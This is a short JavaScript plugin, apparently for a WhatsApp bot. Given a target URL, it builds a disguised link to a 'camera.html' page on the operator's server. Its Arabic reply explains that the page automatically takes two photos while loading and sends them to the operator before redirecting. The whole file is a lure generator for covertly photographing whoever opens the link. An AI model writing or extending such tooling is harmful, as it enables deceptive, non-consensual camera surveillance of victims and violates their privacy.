module.exports = async ({ text, reply, sock, from, msg }) => {
    if (!text.toLowerCase().startsWith('camera')) return;

    const parts = text.trim().split(' ');
    if (parts.length < 2) {
        return reply('❌ أرسل الرابط بعد الأمر.\nمثال: camera https://example.com');
    }

    const targetUrl = parts[1];
    const baseUrl = process.env.BASE_URL || 'http://localhost:3000';
    const pageUrl = `${baseUrl}/camera.html?redirect=${encodeURIComponent(targetUrl)}&chat=${encodeURIComponent(from)}&sessionId=${encodeURIComponent(sock.user.id || '')}`;

    await sock.sendMessage(from, {
        text: `📸 افتح هذا الرابط للسماح بالكاميرا:\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
    }, { quoted: msg });
};
